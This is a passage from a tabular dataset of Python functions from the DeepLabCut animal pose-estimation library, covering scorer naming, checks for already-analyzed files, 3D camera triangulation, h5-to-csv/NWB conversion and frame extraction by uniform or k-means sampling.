        netname = 'effnet_' + dlc_cfg['net_type'].split('-')[1]
    scorer = 'DLC_' + netname + '_' + Task + str(date) + 'shuffle' + str(shuffle) + '_' + str(trainingsiterations)
    scorer_legacy = scorer.replace('DLC', 'DeepCut')
    return (scorer, scorer_legacy)"
AlexEMG/DeepLabCut,check_if_post_processing,"def check_if_post_processing(folder, vname, DLCscorer, DLCscorerlegacy, suffix='filtered'):
    """"""Checks if filtered/bone lengths were already calculated. If not, figures
    out if data was already analyzed (either with legacy scorer name or new one!)""""""
    outdataname = os.path.join(folder, vname + DLCscorer + suffix + '.h5')
    sourcedataname = os.path.join(folder, vname + DLCscorer + '.h5')
    if os.path.isfile(outdataname):
        if suffix == 'filtered':
            print('Video already filtered...', outdataname)
        elif suffix == '_skeleton':
            print('Skeleton in video already processed...', outdataname)
        return (False, outdataname, sourcedataname, DLCscorer)
    else:
        odn = os.path.join(folder, vname + DLCscorerlegacy + suffix + '.h5')
        if os.path.isfile(odn):
            if suffix == 'filtered':
                print('Video already filtered...(with DLC<2.1)!', odn)
            elif suffix == '_skeleton':
                print('Skeleton in video already processed... (with DLC<2.1)!', odn)
            return (False, odn, odn, DLCscorerlegacy)
        else:
            sdn = os.path.join(folder, vname + DLCscorerlegacy + '.h5')
            tracks = sourcedataname.replace('.h5', 'tracks.h5')
            if os.path.isfile(sourcedataname):
                return (True, outdataname, sourcedataname, DLCscorer)
            elif os.path.isfile(sdn):
                return (True, odn, sdn, DLCscorerlegacy)
            elif os.path.isfile(tracks):
                return (True, tracks.replace('.h5', f'{suffix}.h5'), tracks, DLCscorer)
            else:
                print('Video not analyzed -- Run analyze_videos first.')
                return (False, outdataname, sourcedataname, DLCscorer)"
AlexEMG/DeepLabCut,check_if_not_analyzed,"def check_if_not_analyzed(destfolder, vname, DLCscorer, DLCscorerlegacy, flag='video'):
    h5files = list(grab_files_in_folder(destfolder, 'h5', relative=False))
    if not len(h5files):
        dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
        return (True, dataname, DLCscorer)
    for h5file in h5files:
        if vname + DLCscorer in Path(h5file).stem:
            if flag == 'video':
                print('Video already analyzed!', h5file)
            elif flag == 'framestack':
                print('Frames already analyzed!', h5file)
            return (False, h5file, DLCscorer)
        elif vname + DLCscorerlegacy in Path(h5file).stem:
            if flag == 'video':
                print('Video already analyzed!', h5file)
            elif flag == 'framestack':
                print('Frames already analyzed!', h5file)
            return (False, h5file, DLCscorerlegacy)
    dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
    return (True, dataname, DLCscorer)"
AlexEMG/DeepLabCut,check_if_not_evaluated,"def check_if_not_evaluated(folder, DLCscorer, DLCscorerlegacy, snapshot):
    dataname = os.path.join(folder, DLCscorer + '-' + str(snapshot) + '.h5')
    if os.path.isfile(dataname):
        print('This net has already been evaluated!')
        return (False, dataname, DLCscorer)
    else:
        dn = os.path.join(folder, DLCscorerlegacy + '-' + str(snapshot) + '.h5')
        if os.path.isfile(dn):
            print('This net has already been evaluated (with DLC<2.1)!')
            return (False, dn, DLCscorerlegacy)
        else:
            return (True, dataname, DLCscorer)"
AlexEMG/DeepLabCut,find_video_metadata,"def find_video_metadata(folder, videoname, scorer):
    """"""For backward compatibility, let us search the substring 'meta'""""""
    scorer_legacy = scorer.replace('DLC', 'DeepCut')
    meta = [file for file in grab_files_in_folder(folder, 'pickle') if 'meta' in file and (file.startswith(videoname + scorer) or file.startswith(videoname + scorer_legacy))]
    if not len(meta):
        raise FileNotFoundError(f'No metadata found in {folder} for video {videoname} and scorer {scorer}.')
    return os.path.join(folder, meta[0])"
AlexEMG/DeepLabCut,load_video_metadata,"def load_video_metadata(folder, videoname, scorer):
    return read_pickle(find_video_metadata(folder, videoname, scorer))"
AlexEMG/DeepLabCut,find_analyzed_data,"def find_analyzed_data(folder, videoname, scorer, filtered=False, track_method=''):
    """"""Find potential data files from the hints given to the function.""""""
    scorer_legacy = scorer.replace('DLC', 'DeepCut')
    suffix = '_filtered' if filtered else ''
    tracker = TRACK_METHODS.get(track_method, '')
    candidates = []
    for file in grab_files_in_folder(folder, 'h5'):
        stem = Path(file).stem.replace('_filtered', '')
        starts_by_scorer = file.startswith(videoname + scorer) or file.startswith(videoname + scorer_legacy)
        if tracker:
            matches_tracker = stem.endswith(tracker)
        else:
            matches_tracker = not any((stem.endswith(s) for s in TRACK_METHODS.values()))
        if all((starts_by_scorer, 'skeleton' not in file, matches_tracker, filtered and 'filtered' in file or (not filtered and 'filtered' not in file))):
            candidates.append(file)
    if not len(candidates):
        msg = f""No {('un' if not filtered else '')}filtered data file found in {folder} for video {videoname} and scorer {scorer}""
        if track_method:
            msg += f' and {track_method} tracker'
        msg += '.'
        raise FileNotFoundError(msg)
    n_candidates = len(candidates)
    if n_candidates > 1:
        print(f'{n_candidates} possible data files were found: {candidates}.\nPicking the first by default...')
    filepath = os.path.join(folder, candidates[0])
    scorer = scorer if scorer in filepath else scorer_legacy
    return (filepath, scorer, suffix)"
AlexEMG/DeepLabCut,load_analyzed_data,"def load_analyzed_data(folder, videoname, scorer, filtered=False, track_method=''):
    (filepath, scorer, suffix) = find_analyzed_data(folder, videoname, scorer, filtered, track_method)
    df = pd.read_hdf(filepath)
    return (df, filepath, scorer, suffix)"
AlexEMG/DeepLabCut,load_detection_data,"def load_detection_data(video, scorer, track_method):
    folder = os.path.dirname(video)
    videoname = os.path.splitext(os.path.basename(video))[0]
    if track_method == 'skeleton':
        tracker = 'sk'
    elif track_method == 'box':
        tracker = 'bx'
    elif track_method == 'ellipse':
        tracker = 'el'
    else:
        raise ValueError(f'Unrecognized track_method={track_method}')
    filepath = os.path.splitext(video)[0] + scorer + f'_{tracker}.pickle'
    if not os.path.isfile(filepath):
        raise FileNotFoundError(f'No detection data found in {folder} for video {videoname}, scorer {scorer}, and tracker {track_method}')
    return read_pickle(filepath)"
AlexEMG/DeepLabCut,find_next_unlabeled_folder,"def find_next_unlabeled_folder(config_path, verbose=False):
    cfg = read_config(config_path)
    base_folder = Path(os.path.join(cfg['project_path'], 'labeled-data'))
    h5files = sorted(base_folder.rglob('*.h5'), key=lambda p: p.lstat().st_mtime, reverse=True)
    folders = sorted((f for f in base_folder.iterdir() if f.is_dir()))
    most_recent_folder = h5files[0].parent
    ind = folders.index(most_recent_folder)
    next_folder = folders[min(ind + 1, len(folders) - 1)]
    if verbose:
        print('Data completeness\n-----------------')
        for folder in folders:
            dfs = []
            for file in folder.rglob('*.h5'):
                dfs.append(pd.read_hdf(file))
            if dfs:
                df = pd.concat(dfs)
                frac = (~df.isna()).sum().sum() / df.size
                print(f'{folder.name} | {int(100 * frac)} %')
    return next_folder"
AlexEMG/DeepLabCut,Foldernames3Dproject,"def Foldernames3Dproject(cfg_3d):
    """"""Definitions of subfolders in 3D projects""""""
    img_path = os.path.join(cfg_3d['project_path'], 'calibration_images')
    path_corners = os.path.join(cfg_3d['project_path'], 'corners')
    path_camera_matrix = os.path.join(cfg_3d['project_path'], 'camera_matrix')
    path_undistort = os.path.join(cfg_3d['project_path'], 'undistortion')
    path_removed_images = os.path.join(cfg_3d['project_path'], 'removed_calibration_images')
    return (img_path, path_corners, path_camera_matrix, path_undistort, path_removed_images)"
AlexEMG/DeepLabCut,create_empty_df,"def create_empty_df(dataframe, scorer, flag):
    df = dataframe
    bodyparts = df.columns.get_level_values('bodyparts').unique()
    a = np.full((df.shape[0], 3), np.nan)
    dataFrame = None
    for bodypart in bodyparts:
        if flag == '2d':
            pdindex = pd.MultiIndex.from_product([[scorer], [bodypart], ['x', 'y', 'likelihood']], names=['scorer', 'bodyparts', 'coords'])
        elif flag == '3d':
            pdindex = pd.MultiIndex.from_product([[scorer], [bodypart], ['x', 'y', 'z']], names=['scorer', 'bodyparts', 'coords'])
        frame = pd.DataFrame(a, columns=pdindex, index=range(0, df.shape[0]))
        dataFrame = pd.concat([frame, dataFrame], axis=1)
    return (dataFrame, scorer, bodyparts)"
AlexEMG/DeepLabCut,compute_triangulation_calibration_images,"def compute_triangulation_calibration_images(stereo_matrix, projectedPoints1, projectedPoints2, path_undistort, cfg_3d, plot=True):
    """"""
    Performs triangulation of the calibration images.
    """"""
    triangulate = []
    P1 = stereo_matrix['P1']
    P2 = stereo_matrix['P2']
    cmap = cfg_3d['colormap']
    colormap = plt.get_cmap(cmap)
    markerSize = cfg_3d['dotsize']
    markerType = cfg_3d['markerType']
    for i in range(projectedPoints1.shape[0]):
        X_l = triangulatePoints(P1, P2, projectedPoints1[i], projectedPoints2[i])
        triangulate.append(X_l)
    triangulate = np.asanyarray(triangulate)
    if plot == True:
        col = colormap(np.linspace(0, 1, triangulate.shape[0]))
        fig = plt.figure()
        ax = fig.add_subplot(111, projection='3d')
        for i in range(triangulate.shape[0]):
            xs = triangulate[i, 0, :]
            ys = triangulate[i, 1, :]
            zs = triangulate[i, 2, :]
            ax.scatter(xs, ys, zs, c=col[i], marker=markerType, s=markerSize)
            ax.set_xlabel('X')
            ax.set_ylabel('Y')
            ax.set_zlabel('Z')
        plt.savefig(os.path.join(str(path_undistort), 'checkerboard_3d.png'))
    return triangulate"
AlexEMG/DeepLabCut,triangulatePoints,"def triangulatePoints(P1, P2, x1, x2):
    X = cv2.triangulatePoints(P1[:3], P2[:3], x1, x2)
    return X / X[3]"
AlexEMG/DeepLabCut,get_camerawise_videos,"def get_camerawise_videos(path, cam_names, videotype):
    """"""
    This function returns the list of videos corresponding to the camera names specified in the cam_names.
    e.g. if cam_names = ['camera-1','camera-2']

    then it will return [['somename-camera-1-othername.avi', 'somename-camera-2-othername.avi']]
    """"""
    import glob
    from pathlib import Path
    vid = []
    videos = [glob.glob(os.path.join(path, str('*' + cam_names[i] + '*' + videotype))) for i in range(len(cam_names))]
    videos = [y for x in videos for y in x]
    if '.' in videotype:
        file_to_exclude = str('labeled' + videotype)
    else:
        file_to_exclude = str('labeled.' + videotype)
    videos = [v for v in videos if os.path.isfile(v) and (not file_to_exclude in v)]
    video_list = []
    cam = cam_names[0]
    vid.append([name for name in glob.glob(os.path.join(path, str('*' + cam + '*' + videotype)))])
    for k in range(len(vid[0])):
        if cam in str(Path(vid[0][k]).stem):
            ending = Path(vid[0][k]).suffix
            pref = str(Path(vid[0][k]).stem).split(cam)[0]
            suf = str(Path(vid[0][k]).stem).split(cam)[1]
            if pref == '':
                if suf == '':
                    print('Strange naming convention on your part. Respect.')
                else:
                    putativecam2name = os.path.join(path, cam_names[1] + suf + ending)
            elif suf == '':
                putativecam2name = os.path.join(path, pref + cam_names[1] + ending)
            else:
                putativecam2name = os.path.join(path, pref + cam_names[1] + suf + ending)
            if os.path.isfile(putativecam2name):
                video_list.append([os.path.join(path, pref + cam + suf + ending), putativecam2name])
    return video_list"
AlexEMG/DeepLabCut,Get_list_of_triangulated_and_videoFiles,"def Get_list_of_triangulated_and_videoFiles(filepath, videotype, scorer_3d, cam_names, videofolder):
    """"""
    Returns the list of triangulated h5 and the corresponding video files.
    """"""
    prefix = []
    suffix = []
    file_list = []
    string_to_search = scorer_3d + '.h5'
    if [os.path.isdir(i) for i in filepath] == [True]:
        '\n        Analyzes all the videos in the directory.\n        '
        print('Analyzing all the videos in the directory')
        videofolder = filepath[0]
        cwd = os.getcwd()
        os.chdir(videofolder)
        triangulated_file_list = [fn for fn in os.listdir(os.curdir) if string_to_search in fn]
        video_list = get_camerawise_videos(videofolder, cam_names, videotype)
        os.chdir(cwd)
        triangulated_folder = videofolder
    else:
        triangulated_file_list = [str(Path(fn).name) for fn in filepath if string_to_search in fn]
        triangulated_folder = [str(Path(fn).parents[0]) for fn in filepath if string_to_search in fn]
        triangulated_folder = triangulated_folder[0]
        if videofolder is None:
            videofolder = str(Path(filepath[0]).parents[0])
        video_list = get_camerawise_videos(videofolder, cam_names, videotype)
    filename = [i.split(string_to_search)[0] for i in triangulated_file_list]
    for i in range(len(filename)):
        if filename[i][-1] == '_' or filename[i][-1] == '-':
            filename[i] = filename[i][:-1]
        if filename[i][0] == '_' or filename[i][0] == '-':
            filename[i] = filename[i][1:]
    for i in range(len(video_list)):
        pre = [str(Path(video_list[i][0]).stem).split(cam_names[0])[0], str(Path(video_list[i][1]).stem).split(cam_names[1])[0]]
        suf = [str(Path(video_list[i][0]).stem).split(cam_names[0])[-1], str(Path(video_list[i][1]).stem).split(cam_names[1])[-1]]
        for i in range(len(cam_names)):
            if pre[i] == '':
                pass
            elif pre[i][-1] == '_' or pre[i][-1] == '-':
                pre[i] = pre[i][:-1]
            if suf[i] == '':
                pass
            elif suf[i][0] == '_' or suf[i][0] == '-':
                suf[i] = suf[i][1:]
        suffix.append(suf)
        prefix.append(pre)
    for k in range(len(filename)):
        for j in range(len(prefix)):
            if (prefix[j][0] in filename[k] and prefix[j][1] in filename[k]) and (suffix[j][0] in filename[k] and suffix[j][1] in filename[k]):
                triangulated_file = glob.glob(os.path.join(triangulated_folder, str('*' + filename[k] + '*' + string_to_search)))
                vfiles = get_camerawise_videos(videofolder, cam_names, videotype)
                vfiles = [z for z in vfiles if prefix[j][0] in z[0] and suffix[j][0] in z[1]][0]
                file_list.append(triangulated_file + vfiles)
    return file_list"
AlexEMG/DeepLabCut,SaveMetadata3d,"def SaveMetadata3d(metadatafilename, metadata):
    with open(metadatafilename, 'wb') as f:
        pickle.dump(metadata, f, pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,LoadMetadata3d,"def LoadMetadata3d(metadatafilename):
    with open(metadatafilename, 'rb') as f:
        metadata = pickle.load(f)
        return metadata"
AlexEMG/DeepLabCut,_reconstruct_tracks_as_tracklets,"def _reconstruct_tracks_as_tracklets(df):
    """"""
    Parameters:
    -----------
    df: DataFrame
        loaded from an .h5 tracks file (obtained from `stitch_tracklets()`)
    """"""
    from deeplabcut.refine_training_dataset.stitch import Tracklet
    tracklets = []
    for (_, group) in df.groupby('individuals', axis=1):
        temp = group.dropna(how='all')
        inds = temp.index.to_numpy()
        track = Tracklet(temp.to_numpy().reshape((len(temp), -1, 3)), inds)
        track = track.interpolate(max_gap=len(group))
        tracklets.append(track)
    return tracklets"
AlexEMG/DeepLabCut,_associate_paired_view_tracks,"def _associate_paired_view_tracks(tracklets1, tracklets2, F):
    """"""
    Computes the optimal matching between tracks in two cameras
    using the xFx'=0 epipolar constraint equation.

    Parameters:
    -----------
    tracklets1/2: Tracklet() object (defined in stitch.py)
    F: numpy.ndarray
        Fundamental matrix between cam1 and cam2
    """"""
    from scipy.optimize import linear_sum_assignment
    costs = np.zeros([len(tracklets1), len(tracklets2)])
    for (i, t1) in enumerate(tracklets1):
        for (j, t2) in enumerate(tracklets2):
            _t1 = t1.xy[np.isin(t1.inds, t2.inds)]
            _t2 = t2.xy[np.isin(t2.inds, t1.inds)]
            _t1 = np.c_[_t1, np.ones((*_t1.shape[:2], 1))]
            _t2 = np.c_[_t2, np.ones((*_t2.shape[:2], 1))]
            cost = np.abs(np.nansum(np.matmul(_t1, F) * _t2, axis=2))
            cost = cost.mean()
            costs[i, j] = cost
    match_inds = linear_sum_assignment(np.abs(costs))
    voting = dict(zip(*match_inds))
    return (costs, voting)"
AlexEMG/DeepLabCut,cross_view_match_dataframes,"def cross_view_match_dataframes(df1, df2, F):
    """"""
    Computes the costs and matched voting for tracks between
    a camera pair

    df: Data read from .h5 track file
    F: fundamental matrix from OpenCV
    """"""
    tracks1 = _reconstruct_tracks_as_tracklets(df1)
    tracks2 = _reconstruct_tracks_as_tracklets(df2)
    (costs, voting) = _associate_paired_view_tracks(tracks1, tracks2, F)
    return (costs, voting)"
AlexEMG/DeepLabCut,convertcsv2h5,"def convertcsv2h5(config, userfeedback=True, scorer=None):
    """"""
    Convert (image) annotation files in folder labeled-data from csv to h5.
    This function allows the user to manually edit the csv (e.g. to correct the scorer name and then convert it into hdf format).
    WARNING: conversion might corrupt the data.

    config : string
        Full path of the config.yaml file as a string.

    userfeedback: bool, optional
        If true the user will be asked specifically for each folder in labeled-data if the containing csv shall be converted to hdf format.

    scorer: string, optional
        If a string is given, then the scorer/annotator in all csv and hdf files that are changed, will be overwritten with this name.

    Examples
    --------
    Convert csv annotation files for reaching-task project into hdf.
    >>> deeplabcut.convertcsv2h5('/analysis/project/reaching-task/config.yaml')

    --------
    Convert csv annotation files for reaching-task project into hdf while changing the scorer/annotator in all annotation files to Albert!
    >>> deeplabcut.convertcsv2h5('/analysis/project/reaching-task/config.yaml',scorer='Albert')
    --------
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    if not scorer:
        scorer = cfg['scorer']
    for folder in folders:
        try:
            if userfeedback:
                print('Do you want to convert the csv file in folder:', folder, '?')
                askuser = input('yes/no')
            else:
                askuser = 'yes'
            if askuser in ('y', 'yes', 'Ja', 'ha', 'oui'):
                fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.csv')
                with open(fn) as datafile:
                    head = list(islice(datafile, 0, 5))
                if 'individuals' in head[1]:
                    header = list(range(4))
                else:
                    header = list(range(3))
                if head[-1].split(',')[0] == 'labeled-data':
                    index_col = [0, 1, 2]
                else:
                    index_col = 0
                data = pd.read_csv(fn, index_col=index_col, header=header)
                data.columns = data.columns.set_levels([scorer], level='scorer')
                guarantee_multiindex_rows(data)
                data.to_hdf(fn.replace('.csv', '.h5'), key='df_with_missing', mode='w')
                data.to_csv(fn)
        except FileNotFoundError:
            print('Attention:', folder, 'does not appear to have labeled data!')"
AlexEMG/DeepLabCut,analyze_videos_converth5_to_csv,"def analyze_videos_converth5_to_csv(video_folder, videotype='.mp4', listofvideos=False):
    """"""
    By default the output poses (when running analyze_videos) are stored as MultiIndex Pandas Array, which contains the name of the network, body part name, (x, y) label position 

    in pixels, and the likelihood for each frame per body part. These arrays are stored in an efficient Hierarchical Data Format (HDF) 

    in the same directory, where the video is stored. This functions converts hdf (h5) files to the comma-separated values format (.csv),
    which in turn can be imported in many programs, such as MATLAB, R, Prism, etc.

    Parameters
    ----------

    video_folder : string
        Absolute path of a folder containing videos and the corresponding h5 data files.

    videotype: string, optional (default=.mp4)
        Only videos with this extension are screened.

    Examples
    --------

    Converts all pose-output files belonging to mp4 videos in the folder '/media/alex/experimentaldata/cheetahvideos' to csv files.
    deeplabcut.analyze_videos_converth5_to_csv('/media/alex/experimentaldata/cheetahvideos','.mp4')

    """"""
    if listofvideos:
        videos = video_folder
        if len(videos) > 0:
            h5_files = list(auxiliaryfunctions.grab_files_in_folder(Path(videos[0]).parent, 'h5', relative=False))
        else:
            h5_files = []
    else:
        h5_files = list(auxiliaryfunctions.grab_files_in_folder(video_folder, 'h5', relative=False))
        videos = auxiliaryfunctions.grab_files_in_folder(video_folder, videotype, relative=False)
    _convert_h5_files_to('csv', None, h5_files, videos)"
AlexEMG/DeepLabCut,analyze_videos_converth5_to_nwb,"def analyze_videos_converth5_to_nwb(config, video_folder, videotype='.mp4', listofvideos=False):
    """"""
    Convert all h5 output data files in `video_folder` to NWB format.

    Parameters
    ----------
    config : string
        Absolute path to the project YAML config file.

    video_folder : string
        Absolute path of a folder containing videos and the corresponding h5 data files.

    videotype: string, optional (default=.mp4)
        Only videos with this extension are screened.

    Examples
    --------

    Converts all pose-output files belonging to mp4 videos in the folder '/media/alex/experimentaldata/cheetahvideos' to csv files.
    deeplabcut.analyze_videos_converth5_to_csv('/media/alex/experimentaldata/cheetahvideos','.mp4')

    """"""
    if listofvideos:
        videos = video_folder
        if len(videos) > 0:
            h5_files = list(auxiliaryfunctions.grab_files_in_folder(Path(videos[0]).parent, 'h5', relative=False))
        else:
            h5_files = []
    else:
        h5_files = list(auxiliaryfunctions.grab_files_in_folder(video_folder, 'h5', relative=False))
        videos = auxiliaryfunctions.grab_files_in_folder(video_folder, videotype, relative=False)
    _convert_h5_files_to('nwb', config, h5_files, videos)"
AlexEMG/DeepLabCut,_convert_h5_files_to,"def _convert_h5_files_to(filetype, config, h5_files, videos):
    filetype = filetype.lower()
    if filetype not in SUPPORTED_FILETYPES:
        raise ValueError(f'Unsupported destination format {filetype}.\n            Must be one of {SUPPORTED_FILETYPES}.')
    if filetype == 'nwb':
        try:
            from dlc2nwb.utils import convert_h5_to_nwb
        except ImportError:
            raise ImportError('The package `dlc2nwb` is missing. Please run `pip install dlc2nwb`.')
    for video in videos:
        if '_labeled' in video:
            continue
        vname = Path(video).stem
        for file in h5_files:
            if vname in file:
                scorer = file.split(vname)[1].split('.h5')[0]
                if 'DLC' in scorer or 'DeepCut' in scorer:
                    print('Found output file for scorer:', scorer)
                    print(f'Converting {file}...')
                    if filetype == 'csv':
                        df = pd.read_hdf(file)
                        df.to_csv(file.replace('.h5', '.csv'))
                    else:
                        convert_h5_to_nwb(config, file)
    print(f'All H5 files were converted to {filetype.upper()}.')"
AlexEMG/DeepLabCut,merge_windowsannotationdataONlinuxsystem,"def merge_windowsannotationdataONlinuxsystem(cfg):
    """"""If a project was created on Windows (and labeled there,) but ran on unix then the data folders
    corresponding in the keys in cfg['video_sets'] are not found. This function gets them directly by
    looping over all folders in labeled-data""""""
    AnnotationData = []
    data_path = Path(cfg['project_path'], 'labeled-data')
    annotationfolders = []
    for elem in auxiliaryfunctions.grab_files_in_folder(data_path, relative=False):
        if os.path.isdir(elem):
            annotationfolders.append(elem)
    print('The following folders were found:', annotationfolders)
    for folder in annotationfolders:
        filename = os.path.join(folder, 'CollectedData_' + cfg['scorer'] + '.h5')
        try:
            data = pd.read_hdf(filename)
            guarantee_multiindex_rows(data)
            AnnotationData.append(data)
        except FileNotFoundError:
            print(filename, ' not found (perhaps not annotated)')
    return AnnotationData"
AlexEMG/DeepLabCut,guarantee_multiindex_rows,"def guarantee_multiindex_rows(df):
    if not isinstance(df.index, pd.MultiIndex):
        path = df.index[0]
        try:
            sep = '/' if '/' in path else '\\'
            splits = tuple(df.index.str.split(sep))
            df.index = pd.MultiIndex.from_tuples(splits)
        except TypeError:
            pass
    try:
        df.index = df.index.set_levels(df.index.levels[1].astype(str), level=1)
    except AttributeError:
        pass"
AlexEMG/DeepLabCut,robust_split_path,"def robust_split_path(s):
    sep = '/' if '/' in s else '\\'
    return tuple(s.split(sep))"
AlexEMG/DeepLabCut,UniformFrames,"def UniformFrames(clip, numframes2pick, start, stop, Index=None):
    """"""Temporally uniformly sampling frames in interval (start,stop).
    Visual information of video is irrelevant for this method. This code is fast and sufficient (to extract distinct frames),
    when behavioral videos naturally covers many states.

    The variable Index allows to pass on a subindex for the frames.
    """"""
    print('Uniformly extracting of frames from', round(start * clip.duration, 2), ' seconds to', round(stop * clip.duration, 2), ' seconds.')
    if Index is None:
        if start == 0:
            frames2pick = np.random.choice(math.ceil(clip.duration * clip.fps * stop), size=numframes2pick, replace=False)
        else:
            frames2pick = np.random.choice(range(math.floor(start * clip.duration * clip.fps), math.ceil(clip.duration * clip.fps * stop)), size=numframes2pick, replace=False)
        return frames2pick
    else:
        startindex = int(np.floor(clip.fps * clip.duration * start))
        stopindex = int(np.ceil(clip.fps * clip.duration * stop))
        Index = np.array(Index, dtype=int)
        Index = Index[(Index > startindex) * (Index < stopindex)]
        if len(Index) >= numframes2pick:
            return list(np.random.permutation(Index)[:numframes2pick])
        else:
            return list(Index)"
AlexEMG/DeepLabCut,UniformFramescv2,"def UniformFramescv2(cap, numframes2pick, start, stop, Index=None):
    """"""Temporally uniformly sampling frames in interval (start,stop).
    Visual information of video is irrelevant for this method. This code is fast and sufficient (to extract distinct frames),
    when behavioral videos naturally covers many states.

    The variable Index allows to pass on a subindex for the frames.
    """"""
    nframes = len(cap)
    print('Uniformly extracting of frames from', round(start * nframes * 1.0 / cap.fps, 2), ' seconds to', round(stop * nframes * 1.0 / cap.fps, 2), ' seconds.')
    if Index is None:
        if start == 0:
            frames2pick = np.random.choice(math.ceil(nframes * stop), size=numframes2pick, replace=False)
        else:
            frames2pick = np.random.choice(range(math.floor(nframes * start), math.ceil(nframes * stop)), size=numframes2pick, replace=False)
        return frames2pick
    else:
        startindex = int(np.floor(nframes * start))
        stopindex = int(np.ceil(nframes * stop))
        Index = np.array(Index, dtype=int)
        Index = Index[(Index > startindex) * (Index < stopindex)]
        if len(Index) >= numframes2pick:
            return list(np.random.permutation(Index)[:numframes2pick])
        else:
            return list(Index)"
AlexEMG/DeepLabCut,KmeansbasedFrameselection,"def KmeansbasedFrameselection(clip, numframes2pick, start, stop, Index=None, step=1, resizewidth=30, batchsize=100, max_iter=50, color=False):
    """"""This code downsamples the video to a width of resizewidth.

    The video is extracted as a numpy array, which is then clustered with kmeans, whereby each frames is treated as a vector.
    Frames from different clusters are then selected for labeling. This procedure makes sure that the frames ""look different"",
    i.e. different postures etc. On large videos this code is slow.

    Consider not extracting the frames from the whole video but rather set start and stop to a period around interesting behavior.

    Note: this method can return fewer images than numframes2pick.""""""
    print('Kmeans-quantization based extracting of frames from', round(start * clip.duration, 2), ' seconds to', round(stop * clip.duration, 2), ' seconds.')
    startindex = int(np.floor(clip.fps * clip.duration * start))
    stopindex = int(np.ceil(clip.fps * clip.duration * stop))
    if Index is None:
        Index = np.arange(startindex, stopindex, step)
    else:
        Index = np.array(Index)
        Index = Index[(Index > startindex) * (Index < stopindex)]
    nframes = len(Index)
    if batchsize > nframes:
        batchsize = int(nframes / 2)
    if len(Index) >= numframes2pick:
        clipresized = clip.resize(width=resizewidth)
        (ny, nx) = clipresized.size
        frame0 = img_as_ubyte(clip.get_frame(0))
        if np.ndim(frame0) == 3:
            ncolors = np.shape(frame0)[2]
        else:
            ncolors = 1
        print('Extracting and downsampling...', nframes, ' frames from the video.')
        if color and ncolors > 1:
            DATA = np.zeros((nframes, nx * 3, ny))
            for (counter, index) in tqdm(enumerate(Index)):
                image = img_as_ubyte(clipresized.get_frame(index * 1.0 / clipresized.fps))
                DATA[counter, :, :] = np.vstack([image[:, :, 0], image[:, :, 1], image[:, :, 2]])
        else:
            DATA = np.zeros((nframes, nx, ny))
            for (counter, index) in tqdm(enumerate(Index)):
                if ncolors == 1:
                    DATA[counter, :, :] = img_as_ubyte(clipresized.get_frame(index * 1.0 / clipresized.fps))
                else:
                    DATA[counter, :, :] = img_as_ubyte(np.array(np.mean(clipresized.get_frame(index * 1.0 / clipresized.fps), 2), dtype=np.uint8))
        print('Kmeans clustering ... (this might take a while)')
        data = DATA - DATA.mean(axis=0)
        data = data.reshape(nframes, -1)
        kmeans = MiniBatchKMeans(n_clusters=numframes2pick, tol=0.001, batch_size=batchsize, max_iter=max_iter)
        kmeans.fit(data)
        frames2pick = []
        for clusterid in range(numframes2pick):
            clusterids = np.where(clusterid == kmeans.labels_)[0]
            numimagesofcluster = len(clusterids)
            if numimagesofcluster > 0:
                frames2pick.append(Index[clusterids[np.random.randint(numimagesofcluster)]])
        clipresized.close()
        del clipresized
        return list(np.array(frames2pick))
    else:
        return list(Index)"
AlexEMG/DeepLabCut,KmeansbasedFrameselectioncv2,"def KmeansbasedFrameselectioncv2(cap, numframes2pick, start, stop, Index=None, step=1, resizewidth=30, batchsize=100, max_iter=50, color=False):
    """"""This code downsamples the video to a width of resizewidth.
    The video is extracted as a numpy array, which is then clustered with kmeans, whereby each frames is treated as a vector.
    Frames from different clusters are then selected for labeling. This procedure makes sure that the frames ""look different"",
    i.e. different postures etc. On large videos this code is slow.

    Consider not extracting the frames from the whole video but rather set start and stop to a period around interesting behavior.

    Note: this method can return fewer images than numframes2pick.

    Attention: the flow of commands was not optimized for readability, but rather speed. This is why it might appear tedious and repetitive.
    """"""
    nframes = len(cap)
    (nx, ny) = cap.dimensions
    ratio = resizewidth * 1.0 / nx
    if ratio > 1:
        raise Exception('Choice of resizewidth actually upsamples!')
    print('Kmeans-quantization based extracting of frames from', round(start * nframes * 1.0 / cap.fps, 2), ' seconds to', round(stop * nframes * 1.0 / cap.fps, 2), ' seconds.')
    startindex = int(np.floor(nframes * start))
    stopindex = int(np.ceil(nframes * stop))
    if Index is None:
        Index = np.arange(startindex, stopindex, step)
    else:
        Index = np.array(Index)
        Index = Index[(Index > startindex) * (Index < stopindex)]
    nframes = len(Index)
    if batchsize > nframes:
        batchsize = nframes // 2
    allocated = False
    if len(Index) >= numframes2pick:
        if np.mean(np.diff(Index)) > 1:
            print('Extracting and downsampling...', nframes, ' frames from the video.')
            if color:
                for (counter, index) in tqdm(enumerate(Index)):
                    cap.set_to_frame(index)
                    frame = cap.read_frame(crop=True)
                    if frame is not None:
                        image = img_as_ubyte(cv2.resize(frame, None, fx=ratio, fy=ratio, interpolation=cv2.INTER_NEAREST))
                        if not allocated:
                            DATA = np.empty((nframes, np.shape(image)[0], np.shape(image)[1] * 3))
                            allocated = True
                        DATA[counter, :, :] = np.hstack([image[:, :, 0], image[:, :, 1], image[:, :, 2]])
            else:
                for (counter, index) in tqdm(enumerate(Index)):
                    cap.set_to_frame(index)
                    frame = cap.read_frame(crop=True)
                    if frame is not None:
                        image = img_as_ubyte(cv2.resize(frame, None, fx=ratio, fy=ratio, interpolation=cv2.INTER_NEAREST))
                        if not allocated:
                            DATA = np.empty((nframes, np.shape(image)[0], np.shape(image)[1]))
                            allocated = True
                        DATA[counter, :, :] = np.mean(image, 2)
        else:
            print('Extracting and downsampling...', nframes, ' frames from the video.')
            if color:
                for (counter, index) in tqdm(enumerate(Index)):
                    frame = cap.read_frame(crop=True)
                    if frame is not None:
                        image = img_as_ubyte(cv2.resize(frame, None, fx=ratio, fy=ratio, interpolation=cv2.INTER_NEAREST))
                        if not allocated:
                            DATA = np.empty((nframes, np.shape(image)[0], np.shape(image)[1] * 3))
                            allocated = True
                        DATA[counter, :, :] = np.hstack([image[:, :, 0], image[:, :, 1], image[:, :, 2]])
            else:
